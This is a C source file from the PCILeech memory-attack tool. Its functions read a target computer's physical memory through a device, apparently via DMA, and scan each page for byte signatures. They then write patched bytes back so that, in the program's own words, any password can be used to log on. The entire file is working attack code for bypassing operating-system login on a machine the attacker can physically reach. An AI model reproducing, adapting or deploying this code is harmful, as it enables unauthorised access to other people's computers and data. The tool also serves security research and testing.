// mempatch.c : implementation related to operating systems unlock/patch functionality.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "mempatch.h"
#include "device.h"
#include "util.h"

HRESULT Patch_FindAndPatch(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwPgIdx)
{
	PBYTE pb;
	DWORD pgIdx, i;
	PSIGNATURE ps;
	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
		pb = pbPages + (4096 * pgIdx);
		for(i = 0; i < cSignatures; i++) {
			ps = pSignatures + i;
			if(!ps->chunk[0].cb || memcmp(pb + ps->chunk[0].cbOffset, ps->chunk[0].pb, ps->chunk[0].cb)) {
				continue;
			}
			if(ps->chunk[1].cb && memcmp(pb + ps->chunk[1].cbOffset, ps->chunk[1].pb, ps->chunk[1].cb)) {
				continue;
			}
			memcpy(pb + ps->chunk[2].cbOffset, ps->chunk[2].pb, ps->chunk[2].cb);
			*pdwPgIdx = pgIdx;
			return S_OK;
		}
	}
	return E_FAIL;
}

VOID ActionPatch(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
	DWORD pgIdx, cSignatures = CONFIG_MAX_SIGNATURES;
	QWORD qwAddrCurrent;
	PBYTE pbBuffer16M = LocalAlloc(0, 0x01000000);
	BOOL result;
	HRESULT hr;
	PAGE_STATISTICS pageStat;
	// initialize / allocate memory / load signatures
	qwAddrCurrent = pCfg->qwAddrMin ? pCfg->qwAddrMin : 0x100000; // no signature below 1MB
	if(!pbBuffer16M) { return; }
	memset(&pageStat, 0, sizeof(PAGE_STATISTICS));
	pageStat.cPageTotal = (pCfg->qwAddrMax - qwAddrCurrent + 1) / 4096;
	if(!pageStat.cPageTotal) {
		printf("Patch: Failed. Zero or negative memory range specified.\n");
		goto cleanup;
	}
	pageStat.isAccessModeKMD = pDeviceData->KMDHandle ? TRUE : FALSE;
	pageStat.szCurrentAction = "Patching";
	pageStat.qwTickCountStart = GetTickCount64();
	result = Util_LoadSignatures(pCfg->szSignatureName, ".sig", oSignatures, &cSignatures, 3);
	if(!result || !cSignatures) {
		printf("Patch: Failed. Failed to load signature.\n");
		goto cleanup;
	}
	// loop patch / unlock
	while(qwAddrCurrent < pCfg->qwAddrMax) {
		result = DeviceReadMEM(pDeviceData, qwAddrCurrent, pbBuffer16M, 0x01000000);
		if(result) {
			pageStat.cPageSuccess += 4096;
			ShowUpdatePageRead(pCfg, qwAddrCurrent, &pageStat);
			hr = Patch_FindAndPatch(pbBuffer16M, 4096, oSignatures, cSignatures, &pgIdx);
			if(SUCCEEDED(hr)) {
				result = DeviceWriteMEM(pDeviceData, qwAddrCurrent + 4096 * pgIdx, pbBuffer16M + 4096 * pgIdx, 4096);
				if(result) {
					printf("Patch: Successful.\n You may enter any password to log on if an unlock signature was used.\n");
				} else {
					printf("Patch: Failed. Write memory failed.\n");
				}
				goto cleanup;
			}
		} else {
			pageStat.cPageFail += 4096;
			ShowUpdatePageRead(pCfg, qwAddrCurrent, &pageStat);
		}
		qwAddrCurrent += 0x01000000;
	}
	printf("Patch: Failed.\n");
cleanup:
	LocalFree(pbBuffer16M);
}